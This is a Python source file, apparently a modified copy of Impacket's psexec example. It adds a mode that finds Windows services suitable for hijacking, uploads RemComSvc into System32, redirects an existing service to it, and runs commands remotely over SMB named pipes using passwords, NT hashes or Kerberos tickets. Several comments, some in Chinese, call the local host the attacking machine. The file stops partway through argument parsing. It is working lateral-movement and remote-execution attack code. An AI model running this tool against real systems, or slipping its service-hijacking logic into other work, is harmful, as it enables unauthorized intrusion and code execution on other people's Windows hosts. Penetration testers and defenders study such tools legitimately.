#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom)
#
# Author:
#   beto (@agsolino)
#
# Reference for:
#   DCE/RPC and SMB.
#

import sys
import os
import re
import cmd
import logging
from threading import Thread, Lock
import argparse
import random
import string
import time
from six import PY3

from impacket.examples import logger
from impacket import version, smb, LOG
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
from impacket.structure import Structure
from impacket.examples import remcomsvc, serviceinstall, servicechange
from impacket.examples.utils import parse_target
from impacket.krb5.keytab import Keytab

CODEC = sys.stdout.encoding

class RemComMessage(Structure):
    structure = (
        ('Command','4096s=""'),
        ('WorkingDir','260s=""'),
        ('Priority','<L=0x20'),
        ('ProcessID','<L=0x01'),
        ('Machine','260s=""'),
        ('NoWait','<L=0'),
    )

class RemComResponse(Structure):
    structure = (
        ('ErrorCode','<L=0'),
        ('ReturnCode','<L=0'),
    )

RemComSTDOUT = "RemCom_stdout"
RemComSTDIN = "RemCom_stdin"
RemComSTDERR = "RemCom_stderr"

lock = Lock()
class PSEXEC:
    def __init__(self, command, path, exeFile, copyFile, port=445,
                 username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None, serviceName=None,
                 remoteBinaryName=None, service_list=False, service_change=None):
        self.__username = username
        self.__password = password
        self.__port = port
        self.__command = command
        self.__path = path
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__exeFile = exeFile
        self.__copyFile = copyFile
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__serviceName = serviceName
        self.__remoteBinaryName = remoteBinaryName
        self.__service_list = service_list
        self.__service_change = service_change
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')


    def run(self, remoteName, remoteHost):
        # Handle service list functionality
        if self.__service_list:
            return self.listServices(remoteName, remoteHost)
        
        # Handle service hijacking functionality
        if self.__service_change is not None:
            return self.executeViaServiceHijacking(remoteName, remoteHost)
        
        # Original psexec functionality
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s'%stringbinding)

        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)

        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.doStuff(rpctransport)

    def openPipe(self, s, tid, pipe, accessMask):
        pipeReady = False
        tries = 50
        while pipeReady is False and tries > 0:
            try:
                s.waitNamedPipe(tid,pipe)
                pipeReady = True
            except:
                tries -= 1
                time.sleep(2)
                pass

        if tries == 0:
            raise Exception('Pipe not ready, aborting')
        fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)

        return fid

    def listServices(self, remoteName, remoteHost):
        """List all services and mark suitable ones for hijacking"""
        # Service listing functionality for hijacking analysis
        LOG.info("Listing services on %s" % remoteHost)
        
        try:
            # Create SMB connection
            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(self.__port)
            rpctransport.setRemoteHost(remoteHost)
            
            if hasattr(rpctransport, 'set_credentials'):
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, 
                                           self.__lmhash, self.__nthash, self.__aesKey)
            
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
            
            # Create SMB connection for service changer
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            smb_connection = rpctransport.get_smb_connection()
            
            # Create service changer
            service_changer = servicechange.ServiceChanger(smb_connection, remoteHost)
            
            # Get all services
            services = service_changer.listAllServices()
            
            # Filter only suitable services
            suitable_services = [s for s in services if s.is_suitable]
            
            if not suitable_services:
                print("\n" + "="*120)
                print("NO SUITABLE SERVICES FOUND FOR HIJACKING")
                print("="*120)
                return True
            
            # Print header
            print("\n" + "="*120)
            print("SUITABLE SERVICES FOR HIJACKING - %s" % remoteHost)
            print("="*120)
            print("%-30s %-15s %-15s %-15s %-20s" % 
                  ("SERVICE NAME", "START TYPE", "STATUS", "ACCOUNT", "PRIORITY"))
            print("-"*120)
            
            # Sort services by priority (lower number = higher priority)
            suitable_services.sort(key=lambda x: x.priority)
            
            # Print only suitable services
            for service in suitable_services:
                start_type_map = {
                    1: "BOOT",
                    2: "SYSTEM", 
                    3: "MANUAL",
                    4: "DISABLED"
                }
                start_type_str = start_type_map.get(service.start_type, "UNKNOWN")
                
                print("%-30s %-15s %-15s %-15s %-20s" % 
                      (service.service_name[:30], start_type_str, "STOPPED", 
                       service.start_name[:15] if service.start_name else "N/A",
                       str(service.priority)))
            
            print("="*120)
            print("Total suitable services: %d" % len(suitable_services))
            print("="*120)
            
            return True
            
        except Exception as e:
            LOG.critical("Error listing services: %s" % str(e))
            return False

    def executeViaServiceHijacking(self, remoteName, remoteHost):
        """Execute command via service hijacking"""
        # Main service hijacking execution method
        LOG.info("Executing command via service hijacking: %s" % self.__command)
        
        try:
            # Create SMB connection
            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(self.__port)
            rpctransport.setRemoteHost(remoteHost)
            
            if hasattr(rpctransport, 'set_credentials'):
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, 
                                           self.__lmhash, self.__nthash, self.__aesKey)
            
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
            
            # Create SMB connection for service changer
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            smb_connection = rpctransport.get_smb_connection()
            
            # Create service changer
            service_changer = servicechange.ServiceChanger(smb_connection, remoteHost)
            
            # Find suitable service or use specified one
            if self.__service_change:
                # Use specified service
                LOG.info("Using specified service: %s" % self.__service_change)
                service_name = self.__service_change
                
                # Verify service exists and is suitable
                scm_handle = service_changer.openSvcManager()
                service_info = service_changer.getServiceInfo(service_name, scm_handle)
                scmr.hRCloseServiceHandle(service_changer.rpcsvc, scm_handle)
                
                if not service_info.service_name:
                    LOG.critical("Service %s not found" % service_name)
                    return False
                
                if not service_changer.isServiceSuitable(service_info):
                    LOG.critical("Service %s is not suitable: %s" % (service_name, service_info.reason))
                    return False
            else:
                # Find a suitable service automatically
                LOG.info("Looking for suitable service...")
                service_info = service_changer.findSuitableService()
                if not service_info:
                    LOG.critical("No suitable service found for hijacking")
                    return False
                service_name = service_info.service_name
            
            LOG.info("Selected service for hijacking: %s" % service_name)
            
            # Step 1: Prepare service hijacking (restore original config first, then backup)
            LOG.info("Preparing service hijacking...")
            # Restore service to original state if previously hijacked
            
            # First, try to restore service to original state if it was previously hijacked
            LOG.info("Checking if service needs restoration to original state...")
            try:
                # Get current service info to check if it's been hijacked
                scm_handle = service_changer.openSvcManager()
                current_info = service_changer.getServiceInfo(service_name, scm_handle)
                scmr.hRCloseServiceHandle(service_changer.rpcsvc, scm_handle)
                if current_info.binary_path_name and ('RemCom' in current_info.binary_path_name or not current_info.binary_path_name.endswith('.exe') or 'alg.exe' not in current_info.binary_path_name.lower()):
                    LOG.info("Service appears to be hijacked, attempting to restore original configuration...")
                    # Try to restore using a default configuration
                    from impacket.examples.servicechange import ServiceInfo
                    default_config = ServiceInfo()
                    default_config.binary_path_name = "C:\\Windows\\System32\\alg.exe" if service_name == "ALG" else "C:\\Windows\\system32\\ntfrs.exe" if service_name == "NtFrs" else "C:\\Windows\\system32\\vssvc.exe" if service_name == "VSS" else "C:\\Windows\\system32\\SearchIndexer.exe" if service_name == "WSearch" else "C:\\Windows\\System32\\snmptrap.exe" if service_name == "SNMPTRAP" else "C:\\Windows\\system32\\locator.exe" if service_name == "RpcLocator" else ""
                    default_config.start_type = 3  # MANUAL
                    default_config.start_name = "NT AUTHORITY\\LocalService" if service_name in ["ALG", "SNMPTRAP"] else "LocalSystem"
                    service_changer.restoreServiceConfig(service_name, default_config)
                    LOG.info("Service restored to default configuration")
            except Exception as e:
                LOG.debug("Could not restore service to original state: %s" % str(e))
            
            # Now backup the (hopefully) original configuration
            original_config = service_changer.backupServiceConfig(service_name)
            
            # Upload RemComSvc file (use custom file if specified)
            from impacket.examples import serviceinstall
            
            # Determine which executable to use
            if self.__exeFile is not None:
                # Use custom file specified with -file parameter
                LOG.info("Using custom executable: %s" % self.__exeFile)
                try:
                    exe_file = open(self.__exeFile, 'rb')
                except Exception as e:
                    LOG.critical("Error opening custom executable %s: %s" % (self.__exeFile, str(e)))
                    return False
                installService = serviceinstall.ServiceInstall(service_changer.connection, exe_file, service_name, self.__remoteBinaryName)
                remcom_filename = installService.binaryServiceName
                service_changer.uploadFile(exe_file, "System32\\" + remcom_filename)
            else:
                # Use default RemComSvc
                LOG.info("Using default RemComSvc executable")
                installService = serviceinstall.ServiceInstall(service_changer.connection, remcomsvc.RemComSvc(), service_name, self.__remoteBinaryName)
                remcom_svc = remcomsvc.RemComSvc()
                remcom_filename = installService.binaryServiceName
                service_changer.uploadFile(remcom_svc, "System32\\" + remcom_filename)
            
            # Handle -c parameter (copy file and modify command)
            if self.__copyFile is not None:
                LOG.info("Copying file for execution: %s" % self.__copyFile)
                try:
                    # Copy the file to target
                    service_changer.uploadFile(open(self.__copyFile, 'rb'), "System32\\" + os.path.basename(self.__copyFile))
                    # Modify command to use the copied file
                    self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command
                    LOG.info("Modified command to: %s" % self.__command)
                except Exception as e:
                    LOG.critical("Error copying file %s: %s" % (self.__copyFile, str(e)))
                    return False
            
            # Hijack service with RemComSvc
            full_remcom_path = "C:\\Windows\\System32\\" + remcom_filename
            if not service_changer.hijackService(service_name, full_remcom_path):
                LOG.critical("Failed to hijack service")
                return False
            
            LOG.info("Service hijacked successfully, now executing command...")
            
            # Step 2: Execute command through hijacked service
            # The service is already hijacked with RemComSvc, now we need to communicate with it
            LOG.info("Executing command through hijacked service...")
            # Execute command through the hijacked service
            
            # Create SMB connection for communication
            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(self.__port)
            rpctransport.setRemoteHost(remoteHost)
            if hasattr(rpctransport, 'set_credentials'):
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                           self.__nthash, self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
            
            # Execute command through the hijacked service using doStuff logic
            # but skip the service installation part since we already hijacked a service
            self.executeCommandViaHijackedService(rpctransport, service_changer, service_name)
            
            # Step 3: Restore original service configuration
            LOG.info("Restoring original service configuration...")
            # Restore service to original state after command execution
            LOG.info("Original config - Binary Path: %s" % original_config.binary_path_name)
            LOG.info("Original config - Start Type: %d" % original_config.start_type)
            LOG.info("Original config - Start Name: %s" % original_config.start_name)
            if not service_changer.restoreServiceConfig(service_name, original_config):
                LOG.warning("Failed to restore service configuration")
            else:
                LOG.info("Service configuration restored successfully")
            
            # Cleanup uploaded files
            service_changer.cleanupFiles()
            
            # Cleanup -c parameter file if used
            if self.__copyFile is not None:
                try:
                    LOG.info("Cleaning up copied file: %s" % os.path.basename(self.__copyFile))
                    service_changer.connection.deleteFile("ADMIN$", "System32\\" + os.path.basename(self.__copyFile))
                except Exception as e:
                    LOG.warning("Failed to cleanup copied file: %s" % str(e))
            
            return True
            
        except Exception as e:
            LOG.critical("Error executing via service hijacking: %s" % str(e))
            return False

    def executeCommandViaHijackedService(self, rpctransport, service_changer, service_name):
        """Execute command through already hijacked service"""
        # Command execution through hijacked service
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical(str(e))
            sys.exit(1)

        global dialect
        dialect = rpctransport.get_smb_connection().getDialect()
        
        try:
            s = rpctransport.get_smb_connection()
            s.setTimeout(100000)
            
            # Connect to IPC$ and open communication pipe
            tid = s.connectTree('IPC$')
            fid_main = self.openPipe(s, tid, r'\RemCom_communicaton', 0x12019f)
            
            # Create command message
            packet = RemComMessage()
            pid = os.getpid()
            packet['Machine'] = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
            if self.__path is not None:
                packet['WorkingDir'] = self.__path
            packet['Command'] = self.__command
            packet['ProcessID'] = pid

            # Send command to hijacked service
            s.writeNamedPipe(tid, fid_main, packet.getData())

            global LastDataSent
            LastDataSent = ''

            # Start communication pipes
            stdin_pipe = RemoteStdInPipe(rpctransport,
                                       r'\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
                                       smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, None)
            stdin_pipe.start()
            stdout_pipe = RemoteStdOutPipe(rpctransport,
                                         r'\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
                                         smb.FILE_READ_DATA)
            stdout_pipe.start()
            stderr_pipe = RemoteStdErrPipe(rpctransport,
                                         r'\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
                                         smb.FILE_READ_DATA)
            stderr_pipe.start()

            # Wait for response
            ans = s.readNamedPipe(tid, fid_main, 8)
            if len(ans):
                retCode = RemComResponse(ans)
                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (
                self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
                
                # Stop the hijacked service after command execution
                logging.info("Stopping hijacked service after command execution...")
                if not service_changer.stopService(service_name):
                    logging.warning("Failed to stop hijacked service")
                
                sys.exit(retCode['ErrorCode'])

        except SystemExit:
            raise
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.debug(str(e))
            sys.stdout.flush()
            sys.exit(1)

    def doStuff(self, rpctransport):

        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical(str(e))
            sys.exit(1)

        global dialect
        dialect = rpctransport.get_smb_connection().getDialect()

        try:
            unInstalled = False
            s = rpctransport.get_smb_connection()
            s.setTimeout(100000)
            if self.__exeFile is None:
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), remcomsvc.RemComSvc(), self.__serviceName, self.__remoteBinaryName)
            else:
                try:
                    f = open(self.__exeFile, 'rb')
                except Exception as e:
                    logging.critical(str(e))
                    sys.exit(1)
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f, self.__serviceName, self.__remoteBinaryName)
            if installService.install() is False:
                return

            if self.__exeFile is not None:
                f.close()

            if self.__copyFile is not None:
                installService.copy_file(self.__copyFile, installService.getShare(), os.path.basename(self.__copyFile))
                self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command
            tid = s.connectTree('IPC$')
            fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)
            packet = RemComMessage()
            pid = os.getpid()

            packet['Machine'] = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
            if self.__path is not None:
                packet['WorkingDir'] = self.__path
            packet['Command'] = self.__command
            packet['ProcessID'] = pid

            s.writeNamedPipe(tid, fid_main, packet.getData())


            global LastDataSent
            LastDataSent = ''

            stdin_pipe = RemoteStdInPipe(rpctransport,
                                         r'\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
                                         smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, installService.getShare())
            stdin_pipe.start()
            stdout_pipe = RemoteStdOutPipe(rpctransport,
                                           r'\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
                                           smb.FILE_READ_DATA)
            stdout_pipe.start()
            stderr_pipe = RemoteStdErrPipe(rpctransport,
                                           r'\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
                                           smb.FILE_READ_DATA)
            stderr_pipe.start()
            ans = s.readNamedPipe(tid,fid_main,8)

            if len(ans):
                retCode = RemComResponse(ans)
                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (
                self.__command, retCode['ErrorCode'], retCode['ReturnCode']))

            installService.uninstall()
            if self.__copyFile is not None:
                # We copied a file for execution, let's remove it
                s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            unInstalled = True
            sys.exit(retCode['ErrorCode'])

        except SystemExit:
            raise
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.debug(str(e))
            if unInstalled is False:
                installService.uninstall()
                if self.__copyFile is not None:
                    s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            sys.stdout.flush()
            sys.exit(1)


class Pipes(Thread):
    def __init__(self, transport, pipe, permissions, share=None):
        Thread.__init__(self)
        self.server = 0
        self.transport = transport
        self.credentials = transport.get_credentials()
        self.tid = 0
        self.fid = 0
        self.share = share
        self.port = transport.get_dport()
        self.pipe = pipe
        self.permissions = permissions
        self.daemon = True

    def connectPipe(self):
        try:
            lock.acquire()
            global dialect
            #self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port = self.port, preferredDialect = SMB_DIALECT)
            self.server = SMBConnection(self.transport.get_smb_connection().getRemoteName(), self.transport.get_smb_connection().getRemoteHost(),
                                        sess_port=self.port, preferredDialect=dialect)

            user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
            if self.transport.get_kerberos() is True:
                self.server.kerberosLogin(user, passwd, domain, lm, nt, aesKey, kdcHost=self.transport.get_kdcHost(), TGT=TGT, TGS=TGS)
            else:
                self.server.login(user, passwd, domain, lm, nt)
            lock.release()
            self.tid = self.server.connectTree('IPC$')

            self.server.waitNamedPipe(self.tid, self.pipe)
            self.fid = self.server.openFile(self.tid,self.pipe,self.permissions, creationOption = 0x40, fileAttributes = 0x80)
            self.server.setTimeout(1000000)
        except:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)

class RemoteStdOutPipe(Pipes):
    def __init__(self, transport, pipe, permisssions):
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        self.connectPipe()

        global LastDataSent
        if PY3:
            __stdoutOutputBuffer, __stdoutData = b"", b""

            while True:
                try:
                    stdout_ans = self.server.readFile(self.tid, self.fid, 0, 1024)
                except:
                    pass
                else:
                    try:
                        if stdout_ans != LastDataSent:
                            if len(stdout_ans) != 0:
                                # Append new data to the buffer while there is data to read
                                __stdoutOutputBuffer += stdout_ans

                        promptRegex = rb'([a-zA-Z]:[\\\/])((([a-zA-Z0-9 -\.]*)[\\\/]?)+(([a-zA-Z0-9 -\.]+))?)?>$'

                        endsWithPrompt = bool(re.match(promptRegex, __stdoutOutputBuffer) is not None)
                        if endsWithPrompt == True:
                            # All data, we shouldn't have encoding errors
                            # Adding a space after the prompt because it's beautiful
                            __stdoutData = __stdoutOutputBuffer + b" "
                            # Remainder data for next iteration
                            __stdoutOutputBuffer = b""

                            # print("[+] endsWithPrompt")
                            # print(" | __stdoutData:",__stdoutData)
                            # print(" | __stdoutOutputBuffer:",__stdoutOutputBuffer)
                        elif b'\n' in __stdoutOutputBuffer:
                            # We have read a line, print buffer if it is not empty
                            lines = __stdoutOutputBuffer.split(b"\n")
                            # All lines, we shouldn't have encoding errors
                            __stdoutData = b"\n".join(lines[:-1]) + b"\n"
                            # Remainder data for next iteration
                            __stdoutOutputBuffer = lines[-1]

                        if len(__stdoutData) != 0:
                            # There is data to print
                            try:
                                sys.stdout.write(__stdoutData.decode(CODEC))
                                sys.stdout.flush()
                                __stdoutData = b""
                            except UnicodeDecodeError:
                                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                                              'again with -codec and the corresponding codec')
                                print(__stdoutData.decode(CODEC, errors='replace'))
                                __stdoutData = b""
                        else:
                            # Don't echo the command that was sent, and clear it up
                            LastDataSent = b""
                        # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars,
                        # it will give false positives tho.. we should find a better way to handle this.
                        # if LastDataSent > 10:
                        #     LastDataSent = ''
                    except:
                        pass
        else:
            __stdoutOutputBuffer, __stdoutData = "", ""

            while True:
                try:
                    stdout_ans = self.server.readFile(self.tid, self.fid, 0, 1024)
                except:
                    pass
                else:
                    try:
                        if stdout_ans != LastDataSent:
                            if len(stdout_ans) != 0:
                                # Append new data to the buffer while there is data to read
                                __stdoutOutputBuffer += stdout_ans

                        promptRegex = r'([a-zA-Z]:[\\\/])((([a-zA-Z0-9 -\.]*)[\\\/]?)+(([a-zA-Z0-9 -\.]+))?)?>$'

                        endsWithPrompt = bool(re.match(promptRegex, __stdoutOutputBuffer) is not None)
                        if endsWithPrompt:
                            # All data, we shouldn't have encoding errors
                            # Adding a space after the prompt because it's beautiful
                            __stdoutData = __stdoutOutputBuffer + " "
                            # Remainder data for next iteration
                            __stdoutOutputBuffer = ""

                        elif '\n' in __stdoutOutputBuffer:
                            # We have read a line, print buffer if it is not empty
                            lines = __stdoutOutputBuffer.split("\n")
                            # All lines, we shouldn't have encoding errors
                            __stdoutData = "\n".join(lines[:-1]) + "\n"
                            # Remainder data for next iteration
                            __stdoutOutputBuffer = lines[-1]

                        if len(__stdoutData) != 0:
                            # There is data to print
                            sys.stdout.write(__stdoutData.decode(CODEC))
                            sys.stdout.flush()
                            __stdoutData = ""
                        else:
                            # Don't echo the command that was sent, and clear it up
                            LastDataSent = ""
                        # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars,
                        # it will give false positives tho.. we should find a better way to handle this.
                        # if LastDataSent > 10:
                        #     LastDataSent = ''
                    except Exception as e:
                        pass
# 这段代码就是 “远程 stdout 管道输出的清洗器 + 交互模拟器”。


class RemoteStdErrPipe(Pipes):
    def __init__(self, transport, pipe, permisssions):
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        self.connectPipe()

        # 建立和远程进程的 stderr 命名管道 的连接。

        if PY3:
            __stderrOutputBuffer, __stderrData = b'', b''
            # __stderrOutputBuffer：用于拼接未完整的一行错误输出。

            while True:
                try:
                    stderr_ans = self.server.readFile(self.tid, self.fid, 0, 1024)
                except:
                    pass
                else:
                    try:
                        if len(stderr_ans) != 0:
                            # Append new data to the buffer while there is data to read
                            __stderrOutputBuffer += stderr_ans
                            # 无限循环持续读取管道（守护线程模式）。
                            # readFile(..., 1024)：尝试读取最多 1024 bytes。可能的返回：
                            # 非空 bytes：新数据
                            # 空 bytes：可能表示无内容（实现依赖 impacket），但代码只在 len(stderr_ans) != 0 时 append
                            # readFile 抛异常（如网络问题、文件句柄失效）：except 捕获并 pass —— 循环继续（线程不会崩溃）
                            # 把非空读取结果追加到 __stderrOutputBuffer。

                        if b'\n' in __stderrOutputBuffer:
                            # We have read a line, print buffer if it is not empty
                            lines = __stderrOutputBuffer.split(b"\n")
                            # All lines, we shouldn't have encoding errors
                            __stderrData = b"\n".join(lines[:-1]) + b"\n"
                            # Remainder data for next iteration
                            __stderrOutputBuffer = lines[-1]
                            # 如果缓冲中出现 \n 则说明至少有一整行（或多行）可输出。
                            # lines[:-1] 是所有完整行（最后一项可能为不完整的尾部），通过 b"\n".join(...) + b"\n" 恢复原来的换行格式放入 __stderrData。
                            # 将最后一个片段（不完整行或空）留回 __stderrOutputBuffer 以便下一次继续拼接。

                        if len(__stderrData) != 0:
                            # There is data to print
                            try:
                                sys.stdout.write(__stderrData.decode(CODEC))
                                sys.stdout.flush()
                                __stderrData = b""
                            except UnicodeDecodeError:
                                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                                              'again with -codec and the corresponding codec')
                                print(__stderrData.decode(CODEC, errors='replace'))
                                __stderrData = b""
                                # 使用 CODEC（来自脚本顶部 CODEC = sys.stdout.encoding 或 -codec 参数覆盖）对 bytes 调用 .decode(CODEC)，得到 str 并写到 sys.stdout。
                                # sys.stdout.flush() 确保即时输出。
                                # 成功后把 __stderrData 清空。
                        else:
                            # Don't echo the command that was sent, and clear it up
                            LastDataSent = b""
                        # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars,
                        # it will give false positives tho.. we should find a better way to handle this.
                        # if LastDataSent > 10:
                        #     LastDataSent = ''
                    except Exception as e:
                        pass
                    # 处理解析/输出过程中的任意异常并忽略，保持线程存活
        else:
            __stderrOutputBuffer, __stderrData = '', ''

            while True:
                try:
                    stderr_ans = self.server.readFile(self.tid, self.fid, 0, 1024)
                except:
                    pass
                else:
                    try:
                        if len(stderr_ans) != 0:
                            # Append new data to the buffer while there is data to read
                            __stderrOutputBuffer += stderr_ans

                        if '\n' in __stderrOutputBuffer:
                            # We have read a line, print buffer if it is not empty
                            lines = __stderrOutputBuffer.split("\n")
                            # All lines, we shouldn't have encoding errors
                            __stderrData = "\n".join(lines[:-1]) + "\n"
                            # Remainder data for next iteration
                            __stderrOutputBuffer = lines[-1]

                        if len(__stderrData) != 0:
                            # There is data to print
                            sys.stdout.write(__stderrData.decode(CODEC))
                            sys.stdout.flush()
                            __stderrData = ""
                        else:
                            # Don't echo the command that was sent, and clear it up
                            LastDataSent = ""
                        # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars,
                        # it will give false positives tho.. we should find a better way to handle this.
                        # if LastDataSent > 10:
                        #     LastDataSent = ''
                    except:
                        pass

class RemoteShell(cmd.Cmd):
    def __init__(self, server, port, credentials, tid, fid, share, transport):
        cmd.Cmd.__init__(self, False)
        self.prompt = '\x08'
        self.server = server
        self.transferClient = None
        self.tid = tid
        self.fid = fid
        self.credentials = credentials
        self.share = share
        self.port = port
        self.transport = transport
        self.intro = '[!] Press help for extra shell commands'

    def connect_transferClient(self):
        #self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port = self.port, preferredDialect = SMB_DIALECT)
        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port=self.port,
                                            preferredDialect=dialect)
        user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
        if self.transport.get_kerberos() is True:
            self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey,
                                              kdcHost=self.transport.get_kdcHost(), TGT=TGT, TGS=TGS)
        else:
            self.transferClient.login(user, passwd, domain, lm, nt)

    def do_help(self, line):
        print("""
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 lput {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)
 lget {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir
 ! {cmd}                    - executes a local shell cmd
""" % (self.share, self.share))
        self.send_data('\r\n', False)

    def do_shell(self, s):
        os.system(s)
        self.send_data('\r\n')

    def do_lget(self, src_path):
        try:
            if self.transferClient is None:
                self.connect_transferClient()

            import ntpath
            filename = ntpath.basename(src_path)
            # ntpath 是 Python 提供的 Windows 路径处理模块（即使在 Linux 上也能模拟 Windows 路径规则）。src_path 是远程文件路径，ntpath.basename()会提取最后的文件名
            fh = open(filename,'wb')
            # 在攻击机本地打开一个文件，写入模式（二进制）。
            logging.info("Downloading %s\\%s" % (self.share, src_path))
            # 打印日志，提示正在下载哪个共享里的哪个文件。
            self.transferClient.getFile(self.share, src_path, fh.write)
            # 通过 SMB 协议下载文件。
            fh.close()
            # 关闭本地文件句柄，保存下载完成的文件。
        except Exception as e:
            logging.critical(str(e))
            pass
        # 如果下载过程中失败（例如路径错误、权限不足、连接断开），会捕获异常并打印错误信息。

        self.send_data('\r\n')
        # 和 do_shell、do_help 一样，追加换行，保证交互界面整洁。

    def do_lput(self, s):
        try:
            if self.transferClient is None:
                self.connect_transferClient()
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = '/'

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')

            f = dst_path + '/' + src_file
            pathname = f.replace('/','\\')
            logging.info("Uploading %s to %s\\%s" % (src_file, self.share, dst_path))
            if PY3:
                self.transferClient.putFile(self.share, pathname, fh.read)
            else:
                self.transferClient.putFile(self.share, pathname.decode(sys.stdin.encoding), fh.read)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            pass

        self.send_data('\r\n')

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            os.chdir(s)
        self.send_data('\r\n')

    def emptyline(self):
        self.send_data('\r\n')
        return

    def default(self, line):
        if PY3:
            self.send_data(line.encode(CODEC)+b'\r\n')
        else:
            self.send_data(line.decode(sys.stdin.encoding).encode(CODEC)+'\r\n')
    def send_data(self, data, hideOutput = True):
        if hideOutput is True:
            global LastDataSent
            LastDataSent = data
        else:
            LastDataSent = ''
        self.server.writeFile(self.tid, self.fid, data)

class RemoteStdInPipe(Pipes):
    def __init__(self, transport, pipe, permisssions, share=None):
        self.shell = None
        Pipes.__init__(self, transport, pipe, permisssions, share)

    def run(self):
        self.connectPipe()
        self.shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.share, self.transport)
        self.shell.cmdloop()

# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "PSEXEC like functionality example using RemComSvc.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
